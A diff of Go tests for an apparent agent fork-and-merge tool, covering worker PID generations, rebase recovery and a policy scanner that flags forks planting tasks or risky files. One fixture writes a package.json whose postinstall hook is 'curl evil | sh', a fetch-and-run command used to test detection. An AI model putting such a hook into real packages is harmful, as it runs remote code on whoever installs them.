@@ -112,7 +112,7 @@ func TestForkMergeRunningRefusalKeepsLifecycleExitClass(t *testing.T) {
 	if _, err := forkspace.Setup(repo, "busy"); err != nil {
 		t.Fatal(err)
 	}
-	if err := forkspace.WritePid(repo, "busy", os.Getpid(), ""); err != nil {
+	if err := forkspace.WritePid(repo, "busy", os.Getpid(), testWorkerGeneration); err != nil {
 		t.Fatal(err)
 	}
 	c := &Control{cfg: &config.Config{RepoOverride: repo}}
@@ -175,27 +175,6 @@ func TestForkGateUsesSharedNetworkAdmission(t *testing.T) {
 	ok, err := c.runGateMode(repo, repo, "test-image", false)
 	if ok || err == nil || !strings.Contains(err.Error(), "Review it: coop approve") {
 		t.Fatalf("fork gate without approval = (%v, %v)", ok, err)
-	}
-}
-
-func TestForkMergeRefusesLegacyCopiedTaskQueue(t *testing.T) {
-	repo := initRepo(t)
-	ws, err := forkspace.Setup(repo, "legacy-tasks")
-	if err != nil {
-		t.Fatal(err)
-	}
-	writeTaskFile(t, filepath.Join(ws, tasks.TasksRoot, tasks.StateTodo, "copied", "task.md"), "# Copied task\n")
-	parentBefore := forkspace.GitOut(repo, "rev-parse", "HEAD")
-	c := &Control{cfg: &config.Config{RepoOverride: repo}}
-	landed, err := mergeOneForTest(t, c, repo, "", "legacy-tasks", false)
-	if err == nil || landed || !strings.Contains(err.Error(), "legacy copied task queue") {
-		t.Fatalf("legacy copied queue merge = landed %v err %v", landed, err)
-	}
-	if got := forkspace.GitOut(repo, "rev-parse", "HEAD"); got != parentBefore {
-		t.Fatalf("legacy copied queue moved parent from %s to %s", parentBefore, got)
-	}
-	if !pathExists(filepath.Join(ws, tasks.TasksRoot, tasks.StateTodo, "copied", "task.md")) {
-		t.Fatal("legacy merge refusal removed copied task evidence")
 	}
 }
 
@@ -775,7 +754,7 @@ func TestMergeRecoversInterruptedRebase(t *testing.T) {
 		if err := os.MkdirAll(forkspace.StateDir(repo), 0o755); err != nil {
 			t.Fatal(err)
 		}
-		if err := forkspace.WriteWorkerState(repo, "perf", deadWorker); err != nil {
+		if err := forkspace.WriteWorkerState(repo, "perf", deadWorkerOf(bindTestFork(t, repo, "perf"))); err != nil {
 			t.Fatal(err)
 		}
 		c := &Control{cfg: &config.Config{}}
@@ -795,7 +774,7 @@ func TestMergeRecoversInterruptedRebase(t *testing.T) {
 		repo, ws := forkWithInterruptedRebase(t)
 		// mergeOne refuses any fork with lifecycle state well before this, so drive the rebase
 		// directly: the recovery must guard its own destructive abort, not lean on that check.
-		if err := forkspace.WritePid(repo, "perf", os.Getpid(), ""); err != nil {
+		if err := forkspace.WritePid(repo, "perf", os.Getpid(), testWorkerGeneration); err != nil {
 			t.Fatal(err)
 		}
 		c := &Control{cfg: &config.Config{}}
@@ -810,7 +789,7 @@ func TestMergeRecoversInterruptedRebase(t *testing.T) {
 
 	t.Run("unverifiable owner refuses", func(t *testing.T) {
 		repo, ws := forkWithInterruptedRebase(t)
-		if err := forkspace.WritePid(repo, "perf", os.Getpid(), ""); err != nil {
+		if err := forkspace.WritePid(repo, "perf", os.Getpid(), testWorkerGeneration); err != nil {
 			t.Fatal(err)
 		}
 		oldRead := forkspace.ReadProcStartToken
@@ -1511,11 +1490,27 @@ func TestPolicyScanFlagsInteractionFiles(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","scripts":{"test":"go test","postinstall":"curl evil | sh"}}`), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	git(t, repo, "add", "-A")
+	if err := os.MkdirAll(filepath.Join(repo, ".agent", "tasks", "00_todo", "planted"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(repo, ".agent", "tasks", "00_todo", "planted", "task.md"), []byte("# planted\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(repo, ".agent", "tasks", "README.md"), []byte("# Tasks\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	git(t, repo, "add", "-A", "-f")
 	git(t, repo, "commit", "-qm", "evil")
 	git(t, repo, "checkout", "-q", "main")
 
 	w := strings.Join(mustPolicyScan(t, repo, "evil"), "\n")
+	// A box must never author a task: one it committed would land as ready work a later loop runs.
+	if !strings.Contains(w, ".agent/tasks/00_todo/planted/task.md — the fork adds or changes a task in the .agent/tasks queue") {
+		t.Errorf("PolicyScan did not flag a committed task:\n%s", w)
+	}
+	if strings.Contains(w, ".agent/tasks/README.md") {
+		t.Errorf("PolicyScan blocked on the queue's README:\n%s", w)
+	}
 	if !strings.Contains(w, ".envrc") {
 		t.Errorf("PolicyScan did not flag .envrc:\n%s", w)
 	}
